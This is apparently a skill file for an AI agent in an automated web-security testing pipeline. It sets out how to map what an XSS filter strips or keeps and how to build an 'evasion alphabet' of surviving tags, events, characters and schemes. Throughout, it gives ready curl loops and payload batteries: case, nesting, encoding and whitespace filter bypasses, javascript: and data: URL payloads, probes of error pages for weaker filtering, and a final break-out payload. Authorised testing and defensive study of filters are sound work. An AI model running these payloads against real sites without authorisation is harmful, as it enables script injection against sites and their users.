---
name: filter_behavior_analysis
agent: agent6_xss
description: Probe what the filter actually strips, encodes, or keeps; build the evasion alphabet from observed behavior.
---

# Filter Behavior Analysis

## Purpose

Guessing payloads against an unknown filter is lottery. This skill replaces guessing with measurement: it sends a battery of dangerous tokens one at a time, records exactly what the filter does to each (stripped, encoded, uppercased, truncated, kept raw), and compiles the result into an **evasion alphabet** — the set of characters, tags, events, and schemes the filter demonstrably allows. Every later payload is assembled only from this alphabet. A filter that strips `<script` but keeps `<svg` is not a wall, it is a menu. This skill reads the menu.

## Division of labor

- **Consumes:** `findings/reflection_context_map.json` from `reflection_context_map` — specifically the P1/P2 entries with exact context, attribute name, and any observed encoding transform. Also `evidence/reflection_context_map/baseline.html`.
- **Produces:** the finished artifact — `findings/filter_signature.md` — the exact behavioral signature of the filter (what it strips, what it encodes, what it keeps), the evasion alphabet (allowed chars / tags / events / schemes), and the minimal working payload per context. Plus `evidence/filter_behavior_analysis/` with one raw request/response per probe token.

## When to use / when NOT to use

- **Use when:** `reflection_context_map` found a P1/P2 reflection and you need to know what survives the filter before crafting payloads.
- **Use when:** a payload failed — don't guess a new one, re-probe the exact token that died and learn why.
- **Use when:** the filter behaves differently per vector (param A strips `<`, param B encodes it) — each vector gets its own signature.
- **Skip when (time-pass filter):** the reflection context is fully entity-encoded with no decode path and no second reflection (a filter that HTML-encodes `<>&"'` everywhere is done — document NEGATIVE, move on). Also skip when the reflection is in a dead context (HTML comment, title) with no realistic escape.

## Methodology

1. **Pick the target vector.** Take one P1/P2 entry from the context map: one vector, one parameter, one context. Filters are per-vector — never merge results across parameters.
2. **Establish the filter's first impression.** Send `<script>alert(1)</script>` wrapped in a unique canary (`f1<TOKEN>f1`) and record verbatim what comes back. Then send the plain canary alone. The difference is the filter's raw behavior, not the app's.
3. **Run the tag battery.** Send each of these alone, wrapped in canaries, and classify the response as `kept` / `stripped` / `encoded` / `mangled`:
   `script`, `svg`, `img`, `iframe`, `body`, `video`, `audio`, `details`, `object`, `embed`, `math`, `table`, `form`, `button`, `select`, `marquee`, `style`, `link`, `meta`, `base`, `template`, `slot`, `noscript`.
   Send as full open tags: `f1<script>f1`. Record per-tag verdicts in a table.
4. **Run the event battery.** For every tag that survived, test event handlers: `onload`, `onerror`, `onclick`, `onmouseover`, `onfocus`, `onanimationstart`, `onpointerdown`, `ontoggle`, `onbegin`, `onpageshow`. Send `f1<svg onload=x>f1` style probes. Many filters blacklist `script` but forget `onfocus`.
5. **Run the character battery.** Send each of these characters alone between canaries and record survival: `< > " ' ` ( ) = / \ ; : , . ! # & % + - _ [ ] { } | ~ ^ ? @ * $`. The surviving set is your alphabet's character core. Pay special attention to: backtick (template literals), `=` (attribute assignment), `/` (closing tags), `(` `)` (function calls).
6. **Run the scheme battery.** In URL contexts (`href`, `src`, `action`): test `javascript:`, `data:text/html,`, `vbscript:`, `//evil.com`, `/\evil.com`, `java%09script:`. Record which schemes survive and whether the value gets normalized.
7. **Test case sensitivity.** Resend the top 5 blocked tokens in mixed case: `<ScRiPt>`, `<sVg OnLoAd>`. A case-sensitive blacklist is a gift.
8. **Test nesting and doubling.** `<scr<script>ipt>`, `<<script>script>`, `<svg><svg onload=>`. Some filters strip once and stop.
9. **Test encoding layers.** Send the blocked token URL-encoded (`%3Cscript%3E`), HTML-entity-encoded (`&lt;script&gt;`), double-URL-encoded (`%253C`), and UTF-7-ish. Record whether any layer decodes it back to a live token.
10. **Test whitespace and separator tricks.** `<svg/onload=>`, `<svg%09onload=>`, `<svg%0aonload=>`, `<svg/onload%0d=>`. Filters that regex for `<svg onload` often miss `<svg/onload`.
11. **Test comment and null-byte tricks.** `<!-->`, `<script/**/>`, null byte `%00` inside tokens. Record server behavior (400? stripped? kept?).
12. **Determine filter location.** Repeat the top probes with a different HTTP method (GET→POST) and a different path that hits the same backend. Identical behavior = server-side filter. Different behavior = per-route or client-side filter (flag for `dom_sink_audit`).
13. **Probe the filter on error/edge paths.** Send the top 3 blocked tokens to the 404 handler, the login error page, and any debug/error echo endpoints. Filters are frequently absent or weaker on error pages — a token stripped on `/search` may reflect raw on `/404`.
14. **Assemble the evasion alphabet.** Write the definitive table: allowed characters, allowed tags, allowed events, allowed schemes, allowed encodings, and the exact strip/encode rules observed. This is the contract all payloads must obey.
15. **Derive the minimal payload per context.** Using ONLY the alphabet, write the shortest payload for the exact context from the context map (e.g. `attr_double` + allowed `<svg` + allowed `onload` → `"onload=alert(1)` or `"><svg onload=alert(1)>`). Test it. If it executes, you have a CONFIRMED candidate — hand to verification.
16. **Decision branches.**
    - If ≥1 tag AND ≥1 event AND `<>"` survive → payload is days away; proceed to craft and verify.
    - If tags survive but all events are stripped → pivot to `javascript:` URLs, `<a href>`, `<form action>`, or CSS-based vectors; or hand to `dom_sink_audit` for JS-side sinks.
    - If everything dangerous is stripped but the context is `js_string_*` → you may not need tags at all (`'-alert(1)-'`); test break-out directly.
    - If the filter is inconsistent across requests (sometimes strips, sometimes not) → suspect caching/WAF race; document and re-probe 5x before trusting any result.

## Exact commands

Filter first-impression probe (replace `<VECTOR_URL>` with the exact probed URL from the context map):

```bash
mkdir -p evidence/filter_behavior_analysis
curl -sS -o evidence/filter_behavior_analysis/first_impression.html \
  "https://<TARGET>/search?q=f1zZ<script>alert(1)</script>f1zZ" --compressed
grep -o 'f1zZ.\{0,80\}' evidence/filter_behavior_analysis/first_impression.html | head -5
```

Automated token battery (the helper script sends each token wrapped in canaries and classifies kept/stripped/encoded/mangled):

```bash
python3 filter_behavior_analysis/probe_filter.py \
  --url "https://<TARGET>/search" \
  --param q \
  --outdir evidence/filter_behavior_analysis/vec_search_q \
  --method GET
```

Manual tag probe (when you want to see one token's fate in full):

```bash
curl -sS "https://<TARGET>/search?q=g1<svg>g1" --compressed | grep -o 'g1.\{0,60\}g1' | head -3
curl -sS "https://<TARGET>/search?q=g2<svg%20onload%3Dx>g2" --compressed | grep -o 'g2.\{0,60\}g2' | head -3
```

Case/nesting/encoding battery (one-liners, read the reflection):

```bash
for t in '<ScRiPt>' '<scr<script>ipt>' '%3Cscript%3E' '%253Cscript%253E' '<svg/onload=x>'; do
  echo "== $t"; curl -sS --get --data-urlencode "q=h9${t}h9" "https://<TARGET>/search" \
    --compressed | grep -o 'h9.\{0,60\}h9' | head -2
done
```

Scheme battery for URL contexts:

```bash
for s in 'javascript:alert(1)' 'JaVaScRiPt:alert(1)' 'data:text/html,<svg onload=alert(1)>' 'java%09script:alert(1)'; do
  echo "== $s"; curl -sS --get --data-urlencode "next=k7${s}k7" "https://<TARGET>/redir" \
    --compressed | grep -o 'k7.\{0,80\}k7' | head -2
done
```

Filter-location check (same token, different method/route):

```bash
curl -sS -X POST "https://<TARGET>/search" -d "q=m3<svg onload=x>m3" --compressed | grep -o 'm3.\{0,40\}m3' | head -2
```

Error-path filter check (filters are often weaker on 404/error pages):

```bash
curl -sS "https://<TARGET>/no-such-page-e4<svg onload=x>e4" --compressed \
  -o evidence/filter_behavior_analysis/edge_404.html
grep -o 'e4.\{0,60\}e4' evidence/filter_behavior_analysis/edge_404.html | head -3
```

Minimal-payload verification (the exact break-out for the mapped context):

```bash
curl -sS --get --data-urlencode 'q="><svg onload=alert(document.domain)>' \
  "https://<TARGET>/search" --compressed -o evidence/filter_behavior_analysis/verify_p1.html
grep -c 'onload=alert(document.domain)' evidence/filter_behavior_analysis/verify_p1.html
```

## Completion-bias defenses

- [ ] One vector/parameter/context probed at a time (no cross-parameter merging)
- [ ] First-impression probe saved: raw `<script>alert(1)</script>` fate recorded verbatim
- [ ] Full tag battery run (all 22 tags) with kept/stripped/encoded/mangled verdict per tag
- [ ] Event battery run against every surviving tag (10 events minimum)
- [ ] Character battery run (all 30 characters) — surviving set recorded
- [ ] Scheme battery run for URL contexts (6 schemes minimum)
- [ ] Case-sensitivity, nesting, and encoding-layer tests completed
- [ ] Whitespace/separator tricks tested (`/`, `%09`, `%0a`)
- [ ] Filter location determined (server-side vs per-route vs client-side)
- [ ] Evasion alphabet table written: chars, tags, events, schemes, encodings
- [ ] Error/edge paths probed (404, login errors) for weaker filter variants
- [ ] Minimal payload derived from the alphabet ONLY and tested once
- [ ] Raw request/response saved per probe token under `evidence/filter_behavior_analysis/`
- [ ] `findings/filter_signature.md` exists with signature + alphabet + minimal payloads
- [ ] **Review step:** agent10_review must verify: (a) the alphabet contains only tokens actually observed surviving (no assumed allowances), (b) at least 3 probe tokens were re-sent to confirm stable filter behavior, (c) the minimal payload was built exclusively from the alphabet, (d) per-vector signatures are separate files/entries, not merged.
- [ ] **Nudge prompts:**
  - "Keep going until the character battery is complete — the one surviving character you didn't test is the one the bypass needs."
  - "Do not report done before findings/filter_signature.md contains the evasion alphabet table with observed-only entries."
  - "If a payload failed, do not guess a new payload — re-probe the exact dead token and update the signature first."
- [ ] **Finished artifact definition:** `findings/filter_signature.md` — contains the behavioral signature (strip/encode/keep rules), the evasion alphabet table (chars, tags, events, schemes), and the minimal payload per probed context. Existence + completeness IS done.

## Evidence standard

- Baseline: every probe token is compared against the plain-canary response and the known-dead baseline; "stripped" means present-in-baseline-position but token gone, "encoded" means entity/URL-encoded form present.
- Reproduction: the minimal payload per context reproduced 2x; filter behavior re-verified with 3 repeat probes.
- Raw evidence: one request/response pair per probe token under `evidence/filter_behavior_analysis/<vector>/`.
- Verdicts: CONFIRMED (payload reflects executable per the alphabet, 2x reproduced) / INCONCLUSIVE (filter behaves inconsistently across runs — needs second model run) / NEGATIVE (complete strip/encode of all vectors for this context — documented with the signature).

## Handoffs

- `reflection_context_map`: if probing reveals a SECOND reflection context the map missed (common — filters change output shape), send it back for re-mapping.
- `csp_bypass_map`: consumes the minimal payload — needs to know whether the payload is inline-script, event-handler, or URL-scheme based, because CSP treats each differently.
- `stored_xss_chain` / `blind_xss_callback`: consume the evasion alphabet when the stored/blind vector shares the same filter.
- agent10_review: consumes `findings/filter_signature.md` plus the per-token evidence directory.
